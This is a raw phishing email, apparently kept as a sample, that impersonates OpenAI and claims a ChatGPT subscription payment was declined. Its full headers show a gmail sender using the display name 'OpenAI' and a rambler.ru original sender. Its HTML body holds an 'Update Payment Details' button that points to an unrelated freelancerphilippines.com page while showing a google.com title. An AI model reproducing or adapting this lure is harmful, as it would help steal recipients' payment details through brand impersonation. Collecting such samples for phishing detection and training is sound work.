@@ -1,0 +1,168 @@
+Return-Path: <shawonbgi@gmail.com>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id GCnQJXz4MWj+eQAAOB6+FQ
+	(envelope-from <shawonbgi@gmail.com>)
+	for <info@vorteksenerji.com>; Sat, 24 May 2025 19:49:00 +0300
+Return-path: <shawonbgi@gmail.com>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Sat, 24 May 2025 19:49:00 +0300
+Received: from mail-ej1-f52.google.com ([209.85.218.52]:45103)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <shawonbgi@gmail.com>)
+	id 1uIs3Q-000000000Ls-2Srp
+	for info@vorteksenerji.com;
+	Sat, 24 May 2025 19:49:00 +0300
+Received: by mail-ej1-f52.google.com with SMTP id a640c23a62f3a-ad1d1f57a01so162658066b.2
+        for <info@vorteksenerji.com>; Sat, 24 May 2025 09:48:40 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1748105300; x=1748710100; darn=vorteksenerji.com;
+        h=subject:to:mime-version:from:date:message-id:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=PWMDDjokzd+c3sF7wmmh2l4UkWXrAfDeX61Qoc1+sJo=;
+        b=dsOFjEECU7PC8b2BFilVKJJGkcFLFsuD5h5ufaQge6eu+Hzcp8GkZSD1iYS31yRLke
+         W43LgSBazjQ70O+EnnGUXxmPr/WmOwS5IDIgDFAMZvWksWT2XkCnnD6N/GS4qFkicDkW
+         k3zJAVwMGv1xKUEcyKvL8ZrCC9twhmjeJ76REeZJrSYk106Y3Qj1EqYKN5gtbg0sEflR
+         J3e91yNABoz4m1JL+za2k6UmXBIT4WBeC4itOfp6xFdWIDlQ7bNAYB7w7MjHcOj1KGbJ
+         9yhYI0YWW4sa1mAPnSDb51H+jF/2XqAPBEAexLnrrQMtF3mhPb2AyS7ODiDxwpsBrPn1
+         g8bw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1748105300; x=1748710100;
+        h=subject:to:mime-version:from:date:message-id:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=PWMDDjokzd+c3sF7wmmh2l4UkWXrAfDeX61Qoc1+sJo=;
+        b=jdMTtCB1ynXZ5wcFuV5RFKAW2JiI1hjvTSTCIshGuKm7ZIDbihbDE+LJDmBubwV54e
+         Do1T2AQ46tA2nKXNiLwBNbXXN7vaaX34uEXmJFI47luHsXGa7EJtNiW84UE8cbqPhAM+
+         a6CuSkmSva4+o8lwASj183iQqrqgZbUnGas4+YpA1K+zGj0Hlxq9rsGFUx9l8MxI8Vtx
+         mg1oIEYjAWYqbMGVAqWZEwemxRD4gyORQMKDi3yiFbpj6zHiVkGf4K4TV3jcvCMUKgt+
+         tWGPKHk8lxnA565a9mp4VBuObgt9p4WBzZJ2iuDNS9tpwZpRHU+LgDU300LC95zjdFEQ
+         ezOw==
+X-Gm-Message-State: AOJu0Yy5BNQvT+BFevKE02EoD8W1wGav8b6D3ZBAsOx9M/mtZmDPmJYP
+	Nsf0tN5Gf+/ld1HOZASZ6DVYPoBudK5LS3KcjYsBqkRUu5VMsXnXZdK1NfnVWmXL9A==
+X-Gm-Gg: ASbGncsLHfJKb1U0L/g75XAt9IBAbE02gdB4lzGDSzR95HEt6XumTdQ1CSgrmQQoUhv
+	MG5rvbeoPvNzcfHC3/Uttc2a5kvvRbxlA/g22MX/cQUOi6T3cMS0au2ZQBnUeOgdLtNgKWAvRM+
+	6D3vhKTMEPuy1F5XC8lJV4ilCbdwCCnt+M93BFwpxibODsEecmvVz5DrjnvdBwEJcnjoAaIxnN9
+	fQSKDMEo5YaA0y4eR5p/HeTgrba+HVhykk5h/OCp9xrrFZebL6BYgc14ZIQEcub3loM5birugkR
+	jppCmRuzqaqiWxD2euIKchNL0lD/df6OAnokYggalRVpw0mUK0WGZbFw2KqYGizNICgXET1pu6C
+	avk8+BsS7
+X-Google-Smtp-Source: AGHT+IG/HKydqkLWNfr1h7ap0wWvlPfSUdLai82H8A+kvInFQsDhD5248GW7DMA/EeUGczrM2bwOfQ==
+X-Received: by 2002:a17:907:3d93:b0:ad5:42bd:dfab with SMTP id a640c23a62f3a-ad85b1300e6mr287378766b.30.1748105299532;
+        Sat, 24 May 2025 09:48:19 -0700 (PDT)
+Received: from [192.168.1.15] ([105.159.196.228])
+        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-ad5d2c6dbbbsm363733366b.117.2025.05.24.09.48.19
+        for <info@vorteksenerji.com>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sat, 24 May 2025 09:48:19 -0700 (PDT)
+Message-ID: <6831f853.170a0220.1cf26f.8ee0@mx.google.com>
+Date: Sat, 24 May 2025 09:48:19 -0700 (PDT)
+From: OpenAI <shawonbgi@gmail.com>
+X-Google-Original-From: OpenAI <leonidlazarevsq6352@rambler.ru>
+Content-Type: multipart/mixed; boundary="===============9012107157132998581=="
+MIME-Version: 1.0
+To: info@vorteksenerji.com
+Subject: Your ChatGPT Subscription Has Been Paused Due to Payment Issue
+
+--===============9012107157132998581==
+Content-Type: text/html; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD></HEAD>
+<BODY>
+<P>&nbsp;</P>
+<P></P>
+<DIV role=presentation class="ow-mail-MailPreviewBody rich ">
+<TABLE id=bodyTable cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffffff 
+border=0>
+  <TBODY>
+  <TR>
+    <TD class=content-padding style="FONT-SIZE: 1px; LINE-HEIGHT: 0" 
+    width=15>&nbsp;</TD>
+    <TD>
+      <TABLE class=rsp-table-600 
+      style="MAX-WIDTH: 600px; MARGIN-LEFT: auto; MARGIN-RIGHT: auto" 
+      cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
+        <TBODY>
+        <TR>
+          <TD><IMG style="HEIGHT: 48px; WIDTH: 199px" alt="" 
+            src="https://www.tangentia.com/wp%2Dcontent/themes/twentysixteen/images/edi%2Dintegration/openai%2Dlogo.png" 
+            width=2539 height=623></TD></TR>
+        <TR>
+          <TD class=mobile-hide-640 style="PADDING-TOP: 2px" 
+          align=center>&nbsp;</TD></TR>
+        <TR>
+          <TD class=rsp-byline 
+          style="FONT-SIZE: 13px; FONT-FAMILY: Arial , sans-serif; COLOR: #999999; PADDING-BOTTOM: 7px; PADDING-TOP: 2px; LINE-HEIGHT: 1.4" 
+          align=center>
+            <H1 
+            style="FONT-SIZE: 28px; FONT-FAMILY: Segoe UI Semibold , SegoeUISemibold , Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 600; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 16px; LETTER-SPACING: -0.01em; LINE-HEIGHT: 36px; PADDING-RIGHT: 0px">&nbsp;</H1>
+            <H1 
+            style="FONT-SIZE: 28px; FONT-FAMILY: Segoe UI Semibold , SegoeUISemibold , Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 600; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 16px; LETTER-SPACING: -0.01em; LINE-HEIGHT: 36px; PADDING-RIGHT: 0px"><SPAN 
+            style="COLOR: #000000">Subscription Payment Declined</SPAN></H1>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">&nbsp;</P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">Hi 
+            info@vorteksenerji.com,</P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">We 
+            attempted to process your subscription payment for ChatGPT, but 
+            unfortunately, the payment was declined.</P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">This 
+            may be due to an issue with your payment method. To continue 
+            enjoying uninterrupted access to ChatGPT, please update your payment 
+            information.</P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">&nbsp;</P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">
+            <TABLE class=rsp-button cellSpacing=0 cellPadding=0 border=0>
+              <TBODY>
+              <TR>
+                <TD class=rsp-button 
+                style="WHITE-SPACE: nowrap; PADDING-LEFT: 15px; PADDING-RIGHT: 15px" 
+                bgColor=#10a37f height=36 noWrap align=center><A 
+                  title=https://google.com/r/ 
+                  style="FONT-SIZE: 16px; TEXT-DECORATION: none; FONT-FAMILY: Arial, sans-serif; WHITE-SPACE: nowrap; FONT-WEIGHT: bold; COLOR: #ffffff; LINE-HEIGHT: 36px" 
+                  href="https://freelancerphilippines.com/bin" rel=noopener 
+                  target=_blank>Update Payment Details&nbsp; 
+            </A></TD></TR></TBODY></TABLE></P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">&nbsp;</P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">If 
+            you have any questions or need help, feel free to contact our 
+            support team.</P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI , SegoeUI , Roboto , 'Helvetica Neue' , Arial , sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px">Thank 
+            you for using ChatGPT.</P>
+            <P 
+            style="FONT-SIZE: 16px; FONT-FAMILY: Segoe UI, SegoeUI, Roboto, 'Helvetica Neue', Arial, sans-serif; FONT-WEIGHT: 400; COLOR: #11100f; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 12px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" 
+            align=center>The OpenAI Team</P></TD></TR>
+        <TR>
+          <TD style="FONT-SIZE: 1px; LINE-HEIGHT: 0"><A 
+            title='style="DISPLAY:' href="" rel=noopener target=_blank 
+            block?>&nbsp;</A></TD></TR>
+        <TR>
+          <TD 
+          style="FONT-SIZE: 16px; FONT-FAMILY: Arial , sans-serif; COLOR: #000001; PADDING-TOP: 5px; LINE-HEIGHT: 1.4">&nbsp;</TD></TR>
+        <TR>
+          <TD style="PADDING-TOP: 10px">&nbsp;</TD></TR>
+        <TR>
+          <TD style="FONT-SIZE: 1px; LINE-HEIGHT: 0" height=15>&nbsp;</TD></TR>
+        <TR>
+          <TD style="FONT-SIZE: 1px; LINE-HEIGHT: 0" height=20>&nbsp;</TD></TR>
+        <TR>
+          <TD 
+          style="FONT-SIZE: 1px; BORDER-TOP: #e5e5e5 1px solid; LINE-HEIGHT: 0" 
+          height=30>&nbsp;</TD></TR>
+        <TR>
+          <TD 
+          style="FONT-SIZE: 12px; FONT-FAMILY: Arial , sans-serif; COLOR: #999999; TEXT-ALIGN: center; LINE-HEIGHT: 1.4" 
+          align=center>&nbsp;</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV></BODY></HTML>
+
+--===============9012107157132998581==--
